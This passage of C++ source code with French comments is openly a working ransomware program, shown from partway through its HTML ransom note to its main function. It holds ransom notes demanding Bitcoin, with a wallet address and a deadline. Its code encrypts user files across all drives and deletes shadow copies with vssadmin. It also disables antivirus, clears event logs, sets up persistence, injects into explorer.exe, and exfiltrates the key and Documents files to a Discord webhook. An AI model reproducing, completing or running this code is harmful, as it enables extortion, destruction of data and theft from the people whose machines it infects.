                2. Achetez 0.05 BTC sur une plateforme d'échange comme Coinbase, Binance ou Kraken<br>
                3. Envoyez le montant exact à notre adresse<br>
                4. Envoyez la preuve de paiement et votre ID personnel à : <span class="info">unlock@ransomware-recovery.com</span><br>
                5. Vous recevrez l'outil de déchiffrement et les instructions
            </p>
        </div>
        
        <p>
            <span class="warning">N'essayez pas de supprimer ce programme ou de restaurer vos fichiers par d'autres moyens.</span> 
            Cela pourrait endommager définitivement vos fichiers et rendre impossible le déchiffrement.
        </p>
        
        <p>
            Pour prouver que nous pouvons déchiffrer vos fichiers, vous pouvez nous envoyer jusqu'à 3 fichiers (non sensibles, moins de 3 MB chacun) 
            et nous vous les renverrons déchiffrés gratuitement.
        </p>
        
        <p class="info">
            Votre ID personnel : <span class="key">VICTIM-ID-937452AB1CDE</span><br>
            Email de contact : <span class="key">unlock@ransomware-recovery.com</span>
        </p>
    </div>
    
    <script>
        // Compte à rebours de 5 jours
        var countDownDate = new Date();
        countDownDate.setHours(countDownDate.getHours() + 120);
        
        var x = setInterval(function() {
            var now = new Date().getTime();
            var distance = countDownDate - now;
            
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            document.getElementById("countdown").innerHTML = hours + ":" + minutes + ":" + seconds;
            
            if (distance < 0) {
                clearInterval(x);
                document.getElementById("countdown").innerHTML = "EXPIRÉ - PRIX DOUBLÉ";
            }
        }, 1000);
    </script>
</body>
</html>
)";

// Texte de la note de rançon (version texte simple)
const std::string RANSOM_NOTE_TEXT = R"(
!!! ATTENTION !!! VOS FICHIERS ONT ÉTÉ CHIFFRÉS !!!

Tous vos documents importants, photos, vidéos et autres fichiers ont été chiffrés avec un algorithme militaire puissant AES-256 + RSA-2048.

Sans la clé de déchiffrement unique, vos fichiers sont irrécupérables. Les méthodes traditionnelles de récupération sont inutiles contre notre chiffrement.
Vous ne pouvez pas restaurer vos données sans notre aide.

QUE S'EST-IL PASSÉ ?
Vos fichiers personnels ont été chiffrés. De plus, des copies de vos données les plus sensibles ont été extraites et stockées sur nos serveurs sécurisés.
Si vous ne payez pas la rançon, ces informations seront publiées ou vendues.

COMMENT RÉCUPÉRER VOS FICHIERS :
Pour récupérer vos fichiers, vous devez payer une rançon de 0.05 BTC (environ 2000 USD).
Après paiement, vous recevrez automatiquement un outil de déchiffrement qui restaurera tous vos fichiers.

IMPORTANT: Le prix augmentera à 0.1 BTC après 5 jours. De plus, vos données seront publiées.

Adresse Bitcoin : bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

INSTRUCTIONS :
1. Téléchargez un portefeuille Bitcoin comme Electrum, Coinbase ou Blockchain.info
2. Achetez 0.05 BTC sur une plateforme d'échange comme Coinbase, Binance ou Kraken
3. Envoyez le montant exact à notre adresse
4. Envoyez la preuve de paiement et votre ID personnel à : unlock@ransomware-recovery.com
5. Vous recevrez l'outil de déchiffrement et les instructions

N'essayez pas de supprimer ce programme ou de restaurer vos fichiers par d'autres moyens.
Cela pourrait endommager définitivement vos fichiers et rendre impossible le déchiffrement.

Pour prouver que nous pouvons déchiffrer vos fichiers, vous pouvez nous envoyer jusqu'à 3 fichiers (non sensibles, moins de 3 MB chacun)
et nous vous les renverrons déchiffrés gratuitement.

Votre ID personnel : VICTIM-ID-937452AB1CDE
Email de contact : unlock@ransomware-recovery.com
)";

// Générer un ID unique pour la victime
std::string GenerateVictimID() {
    // Obtenir des informations sur le système
    std::string username = GetCurrentUsername();
    std::string computerName = GetComputerName();
    
    // Générer un ID basé sur ces informations et un nombre aléatoire
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(100000, 999999);
    
    // Créer un identifiant basé sur un hash simple
    std::string baseInfo = username + computerName + std::to_string(distrib(gen));
    
    // Calcul d'un hash simple
    std::hash<std::string> hasher;
    size_t hash = hasher(baseInfo);
    
    // Formater l'ID final
    std::stringstream ss;
    ss << "VICTIM-ID-" << std::uppercase << std::hex << hash;
    return ss.str().substr(0, 20); // Limiter à 20 caractères
}

// Créer et placer la note de rançon sur le bureau et dans les dossiers touchés
void CreateRansomNote() {
    std::cout << "[*] Création des notes de rançon..." << std::endl;
    
    // Chemin du bureau de l'utilisateur
    std::string desktopPath = std::string(getenv("USERPROFILE")) + "\\Desktop";
    
    // Générer un ID de victime unique
    std::string victimID = GenerateVictimID();
    
    // Remplacer l'ID de victime générique par l'ID unique
    std::string ransomNoteHtml = RANSOM_NOTE_HTML;
    std::string ransomNoteText = RANSOM_NOTE_TEXT;
    
    size_t pos = ransomNoteHtml.find("VICTIM-ID-937452AB1CDE");
    if (pos != std::string::npos) {
        ransomNoteHtml.replace(pos, 20, victimID);
    }
    
    pos = ransomNoteText.find("VICTIM-ID-937452AB1CDE");
    if (pos != std::string::npos) {
        ransomNoteText.replace(pos, 20, victimID);
    }
    
    // Créer la note de rançon HTML sur le bureau
    std::string htmlNotePath = desktopPath + "\\LIRE_POUR_DECHIFFRER.html";
    std::ofstream htmlNote(htmlNotePath);
    if (htmlNote.is_open()) {
        htmlNote << ransomNoteHtml;
        htmlNote.close();
        
        // Rendre le fichier visible et en lecture seule
        SetFileAttributesA(htmlNotePath.c_str(), FILE_ATTRIBUTE_READONLY);
        
        std::cout << "[+] Note de rançon HTML créée sur le bureau" << std::endl;
    } else {
        std::cout << "[!] Échec de création de la note de rançon HTML" << std::endl;
    }
    
    // Créer la note de rançon texte sur le bureau
    std::string txtNotePath = desktopPath + "\\LIRE_POUR_DECHIFFRER.txt";
    std::ofstream txtNote(txtNotePath);
    if (txtNote.is_open()) {
        txtNote << ransomNoteText;
        txtNote.close();
        
        // Rendre le fichier visible et en lecture seule
        SetFileAttributesA(txtNotePath.c_str(), FILE_ATTRIBUTE_READONLY);
        
        std::cout << "[+] Note de rançon texte créée sur le bureau" << std::endl;
    } else {
        std::cout << "[!] Échec de création de la note de rançon texte" << std::endl;
    }
    
    // Créer des notes dans les dossiers importants
    std::vector<std::string> importantFolders = {
        std::string(getenv("USERPROFILE")) + "\\Documents",
        std::string(getenv("USERPROFILE")) + "\\Pictures",
        std::string(getenv("USERPROFILE")) + "\\Videos",
        std::string(getenv("USERPROFILE")) + "\\Downloads",
        "C:\\",
        "D:\\"
    };
    
    for (const auto& folder : importantFolders) {
        if (!fs::exists(folder)) continue;
        
        std::string notePath = folder + "\\LIRE_POUR_DECHIFFRER.txt";
        std::ofstream note(notePath);
        if (note.is_open()) {
            note << ransomNoteText;
            note.close();
            
            // Rendre le fichier visible et en lecture seule
            SetFileAttributesA(notePath.c_str(), FILE_ATTRIBUTE_READONLY);
            
            std::cout << "[+] Note de rançon créée dans: " << folder << std::endl;
        }
    }
    
    // Modifier le fond d'écran (optionnel, nécessite des droits utilisateur)
    try {
        // Chemin du fichier de fond d'écran temporaire
        std::string wallpaperPath = std::string(getenv("TEMP")) + "\\ransomware_wallpaper.bmp";
        
        // Créer un script PowerShell pour créer une image de fond d'écran
        std::string psScript = std::string(getenv("TEMP")) + "\\wallpaper.ps1";
        std::ofstream wallpaperScript(psScript);
        if (wallpaperScript.is_open()) {
            wallpaperScript << "$text = '" << ransomNoteText.substr(0, 500) << "...'" << std::endl;
            wallpaperScript << "$bitmap = New-Object System.Drawing.Bitmap 1920, 1080" << std::endl;
            wallpaperScript << "$graphics = [System.Drawing.Graphics]::FromImage($bitmap)" << std::endl;
            wallpaperScript << "$graphics.Clear([System.Drawing.Color]::Black)" << std::endl;
            wallpaperScript << "$font = New-Object System.Drawing.Font 'Arial', 16, [System.Drawing.FontStyle]::Bold" << std::endl;
            wallpaperScript << "$brush = [System.Drawing.Brushes]::Red" << std::endl;
            wallpaperScript << "$rect = New-Object System.Drawing.RectangleF 50, 50, 1820, 980" << std::endl;
            wallpaperScript << "$format = New-Object System.Drawing.StringFormat" << std::endl;
            wallpaperScript << "$graphics.DrawString($text, $font, $brush, $rect, $format)" << std::endl;
            wallpaperScript << "$bitmap.Save('" << wallpaperPath << "')" << std::endl;
            wallpaperScript << "$graphics.Dispose()" << std::endl;
            wallpaperScript << "$bitmap.Dispose()" << std::endl;
            wallpaperScript.close();
            
            // Exécuter le script PowerShell
            std::string psCmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + psScript + "\"";
            system(psCmd.c_str());
            
            // Définir le fond d'écran
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            
            // Nettoyer
            fs::remove(psScript);
            
            std::cout << "[+] Fond d'écran modifié avec la note de rançon" << std::endl;
        }
    } catch (const std::exception& e) {
        std::cout << "[!] Échec de modification du fond d'écran" << std::endl;
    }
    
    // Créer un message d'alerte
    MessageBoxA(NULL, 
        "VOS FICHIERS ONT ÉTÉ CHIFFRÉS!\n\nTous vos documents, photos, vidéos et autres fichiers importants ont été chiffrés.\n\nVoir la note sur votre bureau pour plus d'informations sur la récupération.", 
        "!! ATTENTION !! RANSOMWARE !!", 
        MB_ICONERROR | MB_OK);
}

// ===========================================================================================
// FONCTIONS DE CHIFFREMENT DE FICHIERS
// ===========================================================================================

// Vérifier si un fichier doit être chiffré
bool ShouldEncryptFile(const std::string& filePath) {
    // Vérifier si le fichier existe et n'est pas déjà chiffré
    if (!fs::exists(filePath) || filePath.find(ENCRYPTED_EXTENSION) != std::string::npos) {
        return false;
    }
    
    // Vérifier la taille du fichier
    try {
        uintmax_t fileSize = fs::file_size(filePath);
        if (fileSize < 10) { // Ne pas chiffrer les fichiers trop petits
            return false;
        }
        
        // Limiter les fichiers trop grands
        if (fileSize > 100 * 1024 * 1024) { // 100 MB
            return false;
        }
    } catch (const std::exception& e) {
        return false;
    }
    
    // Extraire l'extension du fichier
    std::string extension;
    size_t lastDot = filePath.find_last_of(".");
    if (lastDot != std::string::npos) {
        extension = filePath.substr(lastDot);
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
    } else {
        return false; // Pas d'extension
    }
    
    // Vérifier si l'extension est dans la liste des extensions ciblées
    if (std::find(TARGET_EXTENSIONS.begin(), TARGET_EXTENSIONS.end(), extension) != TARGET_EXTENSIONS.end()) {
        return true;
    }
    
    // Ne pas chiffrer les fichiers système
    std::vector<std::string> systemExtensions = {"sys", "dll", "exe", "com", "bat", "inf", "msi", "ini"};
    for (const auto& ext : systemExtensions) {
        if (extension == "." + ext) {
            return false;
        }
    }
    
    // Éviter certains chemins sensibles
    std::vector<std::string> sensitivePathParts = {
        "Windows", 
        "Program Files", 
        "Program Files (x86)", 
        "ProgramData",
        "AppData\\Local\\Microsoft",
        "AppData\\Roaming\\Microsoft"
    };
    
    for (const auto& part : sensitivePathParts) {
        if (filePath.find(part) != std::string::npos) {
            return false;
        }
    }
    
    // Pour les extensions non prioritaires, chiffrer seulement certains types de fichiers courants
    std::vector<std::string> commonExtensions = {
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp",
        ".mp3", ".mp4", ".wav", ".avi", ".mov", ".mkv",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".sql", ".db", ".sqlite",
        ".cpp", ".h", ".py", ".java", ".php", ".html", ".css", ".js"
    };
    
    if (std::find(commonExtensions.begin(), commonExtensions.end(), extension) != commonExtensions.end()) {
        return true;
    }
    
    // Par défaut, ne pas chiffrer
    return false;
}

// Chiffrer un répertoire récursivement
void EncryptDirectory(AdvancedEncryption& encryption, const std::string& directory, bool recurse = true) {
    std::cout << "[*] Chiffrement du répertoire: " << directory << std::endl;
    
    try {
        fs::directory_options options = fs::directory_options::skip_permission_denied;
        
        if (recurse) {
            for (const auto& entry : fs::recursive_directory_iterator(directory, options)) {
                if (!g_encryptionRunning) break;
                
                if (fs::is_regular_file(entry.path())) {
                    std::string filePath = entry.path().string();
                    
                    if (ShouldEncryptFile(filePath)) {
                        g_totalFiles++;
                        
                        // Tentative de chiffrement du fichier
                        if (encryption.encryptFileWithAes(filePath)) {
                            g_encryptedFiles++;
                            
                            // Afficher la progression
                            if (g_encryptedFiles % 10 == 0) {
                                std::cout << "\r[*] Chiffrement en cours: " << g_encryptedFiles << "/" << g_totalFiles << " fichiers traités";
                            }
                        }
                    }
                }
            }
        } else {
            for (const auto& entry : fs::directory_iterator(directory)) {
                if (!g_encryptionRunning) break;
                
                if (fs::is_regular_file(entry.path())) {
                    std::string filePath = entry.path().string();
                    
                    if (ShouldEncryptFile(filePath)) {
                        g_totalFiles++;
                        
                        // Tentative de chiffrement du fichier
                        if (encryption.encryptFileWithAes(filePath)) {
                            g_encryptedFiles++;
                            
                            // Afficher la progression
                            if (g_encryptedFiles % 10 == 0) {
                                std::cout << "\r[*] Chiffrement en cours: " << g_encryptedFiles << "/" << g_totalFiles << " fichiers traités";
                            }
                        }
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        // Ignorer les erreurs d'accès et continuer
    }
}

// Chiffrer les disques accessibles
void EncryptAccessibleDrives(AdvancedEncryption& encryption) {
    std::cout << "[*] Analyse des disques accessibles..." << std::endl;
    
    // Lecteurs logiques prioritaires
    std::vector<std::string> priorityPaths;
    
    // Obtenir la liste des disques logiques
    char drives[MAX_PATH];
    if (GetLogicalDriveStringsA(MAX_PATH, drives)) {
        char* drive = drives;
        while (*drive) {
            std::string driveLetter = drive;
            
            // Obtenir le type de disque
            UINT driveType = GetDriveTypeA(driveLetter.c_str());
            
            switch (driveType) {
                case DRIVE_FIXED:
                    // Disque dur, ajouter à la liste prioritaire
                    priorityPaths.push_back(driveLetter);
                    break;
                case DRIVE_REMOTE:
                    // Lecteur réseau, ajouter à la liste principale
                    priorityPaths.push_back(driveLetter);
                    break;
                case DRIVE_REMOVABLE:
                    // Lecteur amovible (USB), ajouter en dernier
                    priorityPaths.push_back(driveLetter);
                    break;
                default:
                    // Ignorer les autres types de lecteurs
                    break;
            }
            
            // Passer au lecteur suivant
            drive += strlen(drive) + 1;
        }
    }
    
    // Ajouter des chemins prioritaires pour un chiffrement rapide
    std::string userProfile = std::string(getenv("USERPROFILE"));
    
    priorityPaths.push_back(userProfile + "\\Desktop");
    priorityPaths.push_back(userProfile + "\\Documents");
    priorityPaths.push_back(userProfile + "\\Pictures");
    priorityPaths.push_back(userProfile + "\\Videos");
    priorityPaths.push_back(userProfile + "\\Downloads");
    priorityPaths.push_back(userProfile + "\\OneDrive");
    priorityPaths.push_back(userProfile + "\\Dropbox");
    priorityPaths.push_back(userProfile + "\\Google Drive");
    
    // Chiffrer d'abord les chemins prioritaires (non récursif)
    for (const auto& path : priorityPaths) {
        if (fs::exists(path)) {
            std::cout << "[*] Chiffrement des fichiers dans: " << path << std::endl;
            EncryptDirectory(encryption, path, false);
        }
    }
    
    // Chiffrer récursivement tous les lecteurs
    for (const auto& drivePath : priorityPaths) {
        if (fs::exists(drivePath) && drivePath.length() >= 3 && drivePath[1] == ':') {  // Si c'est un chemin de lecteur
            std::cout << "[*] Chiffrement récursif du lecteur: " << drivePath << std::endl;
            EncryptDirectory(encryption, drivePath, true);
        }
    }
    
    std::cout << "\n[+] Chiffrement terminé. Total: " << g_encryptedFiles << " fichiers chiffrés" << std::endl;
}

// ===========================================================================================
// FONCTION PRINCIPALE
// ===========================================================================================

void RunRansomware() {
    // Début du ransomware
    std::cout << "[*] Initialisation du ransomware..." << std::endl;
    
    // Techniques d'évasion
    ObfuscateBehavior();
    
    // Vérifier si on est dans un environnement virtuel
    if (IsRunningInVirtualMachine()) {
        std::cout << "[!] Environnement virtuel détecté. Comportement modifié." << std::endl;
        // Dans un vrai ransomware, on pourrait terminer le processus ou modifier le comportement
        // Mais pour cet exemple, on continue
    }
    
    // Vérifier si un débogueur est attaché
    if (CheckForDebugger()) {
        std::cout << "[!] Débogueur détecté. Comportement modifié." << std::endl;
        // Dans un vrai ransomware, on pourrait terminer le processus ou modifier le comportement
        // Mais pour cet exemple, on continue
    }
    
    // Vérifier si un antivirus est actif
    if (IsAntivirusActive()) {
        std::cout << "[!] Antivirus détecté. Tentative de désactivation." << std::endl;
        DisableProtections();
    }
    
    // Supprimer les sauvegardes Windows
    DeleteWindowsBackups();
    
    // Supprimer les sauvegardes d'applications
    DeleteApplicationBackups();
    
    // Nettoyer les journaux d'événements
    ClearEventLogs();
    
    // Initialiser le chiffrement
    std::cout << "[*] Initialisation du chiffrement AES+RSA..." << std::endl;
    AdvancedEncryption encryption;
    
    // Sauvegarder la clé AES chiffrée par RSA pour exfiltration
    std::vector<unsigned char> encryptedKey = encryption.encryptAesKeyWithRsa();
    if (!encryptedKey.empty()) {
        std::string tempDir = std::string(getenv("TEMP"));
        std::string keyPath = tempDir + "\\key.bin";
        
        std::ofstream keyFile(keyPath, std::ios::binary);
        if (keyFile) {
            keyFile.write(reinterpret_cast<const char*>(encryptedKey.data()), encryptedKey.size());
            keyFile.close();
            
            // Cacher le fichier de clé
            SetFileAttributesA(keyPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            
            std::cout << "[+] Clé de chiffrement sauvegardée localement" << std::endl;
        }
    }
    
    // Envoyer la clé chiffrée au serveur C&C
    SendEncryptedKeyToWebhook(encryption);
    
    // Exfiltrer des données sensibles avant le chiffrement
    std::string userProfile = std::string(getenv("USERPROFILE"));
    ExfiltrateFiles(userProfile + "\\Documents", 20);
    
    // Désactiver la restauration du système (requiert des privilèges élevés)
    std::string disableRestoreCmd = "vssadmin Delete Shadows /All /Quiet 2>nul";
    system(disableRestoreCmd.c_str());
    
    // Créer la persistance WMI
    SetupWMIPersistence();
    
    // Configurer des techniques Living-off-the-land
    SetupLolPersistence();
    
    // Injection dans un processus système (optionnel)
    InjectIntoSystemProcess("explorer.exe");
    
    // Début du chiffrement
    std::cout << "[*] Début du chiffrement des fichiers..." << std::endl;
    
    // Activer le flag de chiffrement
    g_encryptionRunning = true;
    
    // Chiffrer les disques accessibles
    EncryptAccessibleDrives(encryption);
    
    // Désactiver le flag de chiffrement
    g_encryptionRunning = false;
    
    // Créer la note de rançon
    CreateRansomNote();
    
    std::cout << "[+] Opération de ransomware terminée avec succès" << std::endl;
}

// ===========================================================================================
// FONCTION MAIN
// ===========================================================================================

int main(int argc, char* argv[]) {
    // Masquer la console si en mode normal
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL && argc == 1) {
        ShowWindow(hwnd, SW_HIDE);
    }
    
    // Vérifier les arguments pour les commandes spéciales
    if (argc > 1) {
        std::string arg = argv[1];
        
        if (arg == "--exfil") {
            // Mode exfiltration (tentative d'envoi de données sauvegardées)
            if (argc > 2) {
                std::string filePath = argv[2];
                if (fs::exists(filePath)) {
                    std::ifstream file(filePath, std::ios::binary);
                    if (file) {
                        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        
                        std::string data(buffer.begin(), buffer.end());
                        
                        // Créer un payload JSON pour Discord
                        std::stringstream payload;
                        payload << "{";
                        payload << "\"embeds\": [{";
                        payload << "\"title\": \"🔑 Clé récupérée\",";
                        payload << "\"description\": \"Clé AES chiffrée récupérée d'une tentative précédente\",";
                        payload << "\"color\": 15258703,";
                        payload << "\"fields\": [";
                        payload << "{\"name\": \"💻 Machine\", \"value\": \"" << GetComputerName() << "\"},";
                        payload << "{\"name\": \"👤 Utilisateur\", \"value\": \"" << GetCurrentUsername() << "\"},";
                        payload << "{\"name\": \"🔑 Données\", \"value\": \"```" << data.substr(0, 1000) << "```\"}";
                        payload << "]";
                        payload << "}]";
                        payload << "}";
                        
                        SendHttpPost(WEBHOOK_URL, payload.str());
                        
                        // Supprimer le fichier après envoi
                        fs::remove(filePath);
                    }
                }
            }
            return 0;
        } else if (arg == "--decrypt") {
            // Mode déchiffrement (à implémenter dans un outil de récupération séparé)
            MessageBoxA(NULL, "Ce mode n'est accessible qu'après paiement de la rançon.", "Déchiffrement non disponible", MB_ICONERROR | MB_OK);
            return 0;
        } else if (arg == "--test") {
            // Mode test (pour vérifier que tout fonctionne)
            std::cout << "[*] Mode test" << std::endl;
            
            AdvancedEncryption encryption;
            std::string testFile = "test_file.txt";
            
            // Créer un fichier de test
            std::ofstream file(testFile);
            if (file) {
                file << "Ceci est un fichier de test pour vérifier le fonctionnement du ransomware." << std::endl;
                file.close();
                
                std::cout << "[+] Fichier de test créé" << std::endl;
                
                // Chiffrer le fichier
                if (encryption.encryptFileWithAes(testFile)) {
                    std::cout << "[+] Fichier chiffré avec succès" << std::endl;
                    
                    // Déchiffrer le fichier
                    if (encryption.decryptFileWithAes(testFile + ENCRYPTED_EXTENSION)) {
                        std::cout << "[+] Fichier déchiffré avec succès" << std::endl;
                    } else {
                        std::cout << "[!] Échec du déchiffrement" << std::endl;
                    }
                } else {
                    std::cout << "[!] Échec du chiffrement" << std::endl;
                }
            }
            
            return 0;
        }
    }
    
    // Exécuter le ransomware
    RunRansomware();
    
    return 0;
}
